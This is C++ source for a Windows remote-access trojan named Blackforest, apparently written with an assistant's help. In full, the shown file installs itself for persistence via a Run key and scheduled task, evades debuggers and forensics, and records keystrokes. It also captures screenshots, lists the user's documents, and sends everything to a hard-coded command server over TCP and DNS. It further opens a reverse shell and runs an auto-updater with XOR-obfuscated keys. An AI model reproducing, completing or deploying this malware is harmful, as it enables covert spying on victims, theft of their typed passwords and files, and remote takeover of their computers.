// main.cpp - Master Controller
#include <winsock2.h> // Must be first!
#include "core/evasion/syscall_hook.hpp"
#include "core/evasion/process_hollowing.hpp"
#include "obfuscation/polymorphic.hpp"
#include "exfil/dns_tunnel.hpp"
#include "exfil/tcp_client.hpp" // New

#include "core/collection/system_info.hpp"
#include "core/collection/screenshot.hpp"
#include "core/collection/file_walker.hpp"
#include "core/collection/reverse_shell.hpp" // New
#include "core/maintenance/updater.hpp" // New
#include "core/evasion/timestomp.hpp"   // New
#include "core/persistence/scheduled_task.hpp" // New

#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <mutex>
#include <chrono>
#include <windows.h>
#include <tlhelp32.h>
#include <iomanip>
#include <sstream>

// Simple Base64 Encoder
static const std::string base64_chars = 
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";

std::string base64_encode(const std::vector<uint8_t>& buf) {
    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    for (auto byte : buf) {
        char_array_3[i++] = byte;
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for(i = 0; (i <4) ; i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i) {
        for(j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (j = 0; (j < i + 1); j++)
            ret += base64_chars[char_array_4[j]];

        while((i++ < 3))
            ret += '=';
    }

    return ret;
}

// Simple XOR Deobfuscator
std::string Deobfuscate(const std::vector<unsigned char>& encrypted, unsigned char key) {
    std::string decrypted = "";
    for(unsigned char c : encrypted) {
        decrypted += (char)(c ^ key);
    }
    return decrypted;
}

class Blackforest {
private:
    DirectSyscall syscall;
    PolymorphicEngine poly;
    DNSTunnel dns;      // Keep for backup/C2 commands
    TcpClient tcp;      // Primary exfiltration
    bool running = false;
    
    class SecureLog {
        std::vector<std::string> buffer;
        std::mutex mtx; 
        PolymorphicEngine& polyRef;
        DNSTunnel& dnsRef;
        TcpClient& tcpRef;
        
    public:
        SecureLog(PolymorphicEngine& p, DNSTunnel& d, TcpClient& t) : polyRef(p), dnsRef(d), tcpRef(t) {}
        
        void Add(const std::string& entry) {
            std::lock_guard<std::mutex> lock(mtx);
            buffer.push_back(entry); 
            if(buffer.size() >= 1) Flush(); 
        }
        
        void Flush() {
            if(buffer.empty()) return;
            std::string combined = "[KEYLOG]: ";
            for(auto& s : buffer) combined += s;
            
            // Try TCP First
            if(!tcpRef.SendData(combined)) {
                // If TCP fails, Fallback to DNS or do both? 
                // User said "if any one there that should send" -> redundant send.
            }
            // Send via DNS too (simulated/backup)
            dnsRef.Exfiltrate(polyRef.EncryptString(combined));
            
            buffer.clear();
        }

        void ExfiltrateDirect(const std::string& data) {
             // Dual Send
             tcpRef.SendData(data); 
             dnsRef.Exfiltrate(polyRef.EncryptString(data.substr(0, 50))); // DNS has size limits, send snippet
        }
    };
    
    SecureLog secureLog;
    
public:
    // C2 Configuration
    // Replace "127.0.0.1" with the USER DESIGNATED IP
    // Replace "127.0.0.1" and "example.com" with REAL C2 config
    Blackforest() : poly(1234), dns("example.com"), tcp("192.168.0.3", 4444), secureLog(poly, dns, tcp) {
        if(CheckDebuggers()) exit(0);
    }
    
    void Start() {
        running = true;
        Timestomp::CloneExplorer(); // Anti-Forensics
        InstallPersistence();
        ScheduledTask::Install();   // Backup Persistence
        
        // Initial Notification
        secureLog.ExfiltrateDirect("[*] Blackforest Agent Started on: " + SystemInfo::GetHostName());
        secureLog.ExfiltrateDirect("INFO: " + SystemInfo::GetAllInfo());
        
        std::thread keyThread(&Blackforest::KeyMonitor, this);
        std::thread sysThread(&Blackforest::SystemMonitor, this);
        std::thread screenThread(&Blackforest::ScreenMonitor, this);
        std::thread fileThread(&Blackforest::FileMonitor, this);
        
        // Spawn Interactive Shell on Port 4445
        // This connects cmd.exe directly to attacker ip:4445
        std::thread shellThread([this]() {
             ReverseShell::Start("192.168.0.3", 4445);
        });
        shellThread.detach(); // Let it run independently
        
        // Spawn Auto-Updater (Port 8000)
        std::thread updateThread([]() {
            // "d8adffdd91cf73d5995383e5559625622d49d95ff6fea9618e125121ef2bf6d0" XOR 0x55
            std::vector<unsigned char> encKey = {
                0x31, 0x6d, 0x34, 0x31, 0x33, 0x33, 0x31, 0x31, 0x6c, 0x64, 0x36, 0x33, 0x62, 0x66, 0x31, 0x60, 
                0x6c, 0x6c, 0x60, 0x66, 0x6d, 0x66, 0x30, 0x60, 0x60, 0x60, 0x6c, 0x63, 0x67, 0x60, 0x63, 0x67, 
                0x67, 0x31, 0x61, 0x6c, 0x31, 0x6c, 0x60, 0x33, 0x33, 0x63, 0x33, 0x30, 0x34, 0x6c, 0x63, 0x64, 
                0x6d, 0x30, 0x64, 0x67, 0x60, 0x64, 0x67, 0x64, 0x30, 0x33, 0x67, 0x37, 0x33, 0x63, 0x31, 0x65
            };
            // Kill Key: "09827a..." XOR 0x55
            std::vector<unsigned char> killKey = {
                0x65, 0x6c, 0x6d, 0x67, 0x62, 0x34, 0x6d, 0x65, 0x64, 0x30, 0x34, 0x6c, 0x66, 0x64, 0x36, 0x31,
                0x34, 0x36, 0x33, 0x63, 0x30, 0x30, 0x6d, 0x6d, 0x67, 0x6d, 0x37, 0x66, 0x67, 0x6d, 0x66, 0x34,
                0x31, 0x31, 0x6c, 0x30, 0x63, 0x6c, 0x61, 0x62, 0x63, 0x61, 0x34, 0x6d, 0x36, 0x65, 0x34, 0x30,
                0x34, 0x65, 0x63, 0x33, 0x62, 0x66, 0x37, 0x6c, 0x30, 0x30, 0x31, 0x63, 0x63, 0x31, 0x67, 0x67
            };
            
            Updater::Start("192.168.0.3", 8000, Deobfuscate(encKey, 0x55), Deobfuscate(killKey, 0x55));
        });
        updateThread.detach();
        
        // Main Loop - Backup C2 check
        while(running) {
            // std::string cmd = dns.ReceiveCommand(); 
            // if(!cmd.empty()) ExecuteCommand(cmd);
            Sleep(5000); 
        }
        
        keyThread.join();
        sysThread.join();
        screenThread.join();
        fileThread.join();
    }
    
private:
    bool CheckDebuggers() { return IsDebuggerPresent(); }
    
    void InstallPersistence() {
        char currentPath[MAX_PATH];
        if(!GetModuleFileNameA(NULL, currentPath, MAX_PATH)) return;

        char destPath[MAX_PATH];
        if(!ExpandEnvironmentStringsA("%APPDATA%\\Blackforest", destPath, MAX_PATH)) return;
        
        CreateDirectoryA(destPath, NULL);
        strcat(destPath, "\\Blackforest.exe");
        
        // Copy Self
        // If we are already running from dest, skip
        if(strcasecmp(currentPath, destPath) != 0) {
            CopyFileA(currentPath, destPath, FALSE);
        }

        HKEY hKey;
        if(RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "BlackforestUpdater", 0, REG_SZ, (BYTE*)destPath, strlen(destPath)+1);
            RegCloseKey(hKey);
        }
        
        // MELT: If we are not running from AppData/Blackforest, run the installed one and exit
        if(strcasecmp(currentPath, destPath) != 0) {
            STARTUPINFOA si = { sizeof(si) };
            PROCESS_INFORMATION pi;
            // Create the persistent process
            // DETACHED_PROCESS (0x00000008) -> No console
            // CREATE_NO_WINDOW (0x08000000) -> No window
            if(CreateProcessA(destPath, NULL, NULL, NULL, FALSE, 0x08000000 | 0x00000008, NULL, NULL, &si, &pi)) {
                 // Close handles and Exit this "Dropper" instance
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
                 exit(0); 
            }
        }
    }

    void KeyMonitor() {
        std::string pendingKeys = "";
        auto lastFlush = std::chrono::steady_clock::now();

        while(running) {
            bool keysAdded = false;
            for(int i = 8; i <= 255; i++) {
                if(GetAsyncKeyState(i) & 1) {
                    std::string key;
                    if((i >= 'A' && i <= 'Z') || (i >= '0' && i <= '9')) key += (char)i;
                    else if (i == VK_SPACE) key += " ";
                    else if (i == VK_RETURN) key += "\n";
                    else if (i == VK_BACK) key += "[BS]";
                    else if (i == VK_OEM_PERIOD) key += ".";
                    else if (i == VK_SHIFT || i == VK_CONTROL || i == VK_MENU) continue; 
                    else key += ".";
                    
                    pendingKeys += key;
                    keysAdded = true;
                }
            }

            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - lastFlush).count();

            // FLUSH LOGIC:
            // 1. Time > 2 seconds (Keep it snappy but not crazy)
            // 2. OR Buffer > 1 char (Wait for at least a couple of keys?) 
            // Let's actually do: Flush if not empty and elapsed > 1s.
            // OR if pendingKeys has newline.
            
            if (!pendingKeys.empty()) {
                // INSTANT MODE: Flush if ANY key is in buffer (>= 1)
                // Also added debug print to verify hook
                if(elapsed >= 1 || pendingKeys.length() >= 1 || pendingKeys.back() == '\n') {
                     // std::cout << "Sending: " << pendingKeys << std::endl; // Debug
                     secureLog.ExfiltrateDirect("[KEYLOG]: " + pendingKeys);
                     pendingKeys.clear();
                     lastFlush = now;
                }
            }
            
            Sleep(10);
        }
    }
    
    void SystemMonitor() {
        while(running) {
            Sleep(60000); 
             secureLog.ExfiltrateDirect("HEARTBEAT: " + SystemInfo::GetIPAddress());
        }
    }
    
    void ScreenMonitor() {
        while(running) {
            Sleep(30000); 
            std::vector<uint8_t> img = Screenshot::Capture();
            if(!img.empty()) {
                // Send header first? 
                // Send header + Base64 Body
                std::stringstream ss;
                std::string encoded = base64_encode(img);
                ss << "SCREENSHOT[" << encoded.size() << "]:" << encoded; 
                secureLog.ExfiltrateDirect(ss.str());
            }
        }
    }

    void FileMonitor() {
        char path[MAX_PATH];
        ExpandEnvironmentStringsA("%USERPROFILE%\\Documents", path, MAX_PATH);
        std::vector<std::string> exts = {".txt", ".pdf", ".doc", ".docx", ".key"};
        std::vector<std::string> files = FileWalker::Scan(std::string(path), exts);
        
        // Also scan Downloads
        char path2[MAX_PATH];
        ExpandEnvironmentStringsA("%USERPROFILE%\\Downloads", path2, MAX_PATH);
        std::vector<std::string> files2 = FileWalker::Scan(std::string(path2), exts);
        files.insert(files.end(), files2.begin(), files2.end());
        
        std::stringstream ss;
        ss << "DOCS_FOUND(" << files.size() << "):\n";
        for(const auto& f : files) {
            ss << f << "\n";
        }
        secureLog.ExfiltrateDirect(ss.str());
    }
    
    void ExecuteCommand(const std::string& cmd) {
        if(cmd == "shutdown") running = false;
    }
};

int main() {
    Blackforest bf;
    bf.Start();
    return 0;
}